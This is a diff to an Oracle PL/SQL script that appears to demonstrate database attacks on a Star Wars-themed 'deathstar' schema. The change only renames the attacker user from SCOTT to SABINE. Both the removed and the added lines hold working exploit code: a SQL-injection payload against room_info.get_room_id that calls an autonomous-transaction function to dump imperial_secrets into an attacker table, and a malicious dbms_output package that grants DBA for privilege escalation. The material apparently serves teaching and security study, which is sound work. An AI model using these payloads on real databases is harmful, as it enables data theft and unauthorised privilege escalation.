@@ -88,7 +88,7 @@ select * from log_201911;
 
 
 --------------------------
--- --> AS SCOTT
+-- --> AS SABINE
 --------------------------
 create table secret_dump (
   secret varchar2(4000),
@@ -100,7 +100,7 @@ create or replace function bad_func
   as
     pragma autonomous_transaction;
   begin
-		execute immediate 'insert into scott.secret_dump (secret) select secret from imperial_secrets';
+		execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
 		commit;
 		return 'Y';
   end;
@@ -114,12 +114,12 @@ grant insert on secret_dump to public;
 -- Deathstar hat ROOM_INFO für PUBLIC freigegeben
 -- grant execute on room_info to public;
 
--- Exploit direkt als SCOTT
+-- Exploit direkt als SABINE
 truncate table secret_dump;
 select * from secret_dump;
 
 -- TODO: This should work!
-select deathstar.room_info.get_room_id(''') and scott.bad_func() = ''Y''--') from dual;
+select deathstar.room_info.get_room_id(''') and sabine.bad_func() = ''Y''--') from dual;
 
 
 select * from secret_dump;
@@ -160,7 +160,7 @@ select is_admin('Ädmin') from dual;
 
 /* 7. Synonym Attack */
 --------------------------
--- --> AS SCOTT
+-- --> AS SABINE
 --------------------------
 create or replace package malicious_dbms_output authid current_user as
 	procedure put_line( i_input varchar2 );
@@ -173,7 +173,7 @@ create or replace package body malicious_dbms_output as
   as
     pragma autonomous_transaction;
     begin
-      execute immediate 'grant dba to scott';
+      execute immediate 'grant dba to sabine';
       sys.dbms_output.put_line('Granting succeeded!'); -- Diese würden im echten Fall natürlich ausgelassen!
     exception when others then
       sys.dbms_output.put_line('Granting DBA not succeeded: ' || sqlerrm); -- Diese würden im echten Fall natürlich ausgelassen!
